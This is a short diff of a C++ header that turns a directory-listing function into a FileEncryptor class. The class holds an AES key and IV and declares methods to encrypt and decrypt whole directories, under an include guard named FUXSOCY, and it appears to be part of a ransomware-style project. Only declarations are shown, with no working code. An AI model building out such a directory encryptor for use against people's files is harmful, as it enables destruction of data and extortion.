@@ -9,12 +9,23 @@ extern "C" {
 #include <vector>
 #include <string>
 
+#include <cryptopp/aes.h>
 
-namespace file_encryptor {
+class FileEncryptor {
+ public:
+  FileEncryptor(const std::string& directory);
+  virtual ~FileEncryptor();
 
-// Iteratively enumerates all files within a directory.
-std::vector<std::string> ListDirectory(std::string& directory);
+  std::vector<std::string> ListDirectory() const;
 
-} // namespace file_encryptor
+ private:
+  void EncryptDirectory(const std::string& directory) const;
+  void DecryptDirectory(const std::string& directory) const;
+
+  
+  CryptoPP::byte* iv_;
+  CryptoPP::byte* key_;
+  std::string directory_;
+};
 
 #endif // FUXSOCY_FILE_ENCRYPTOR_H_
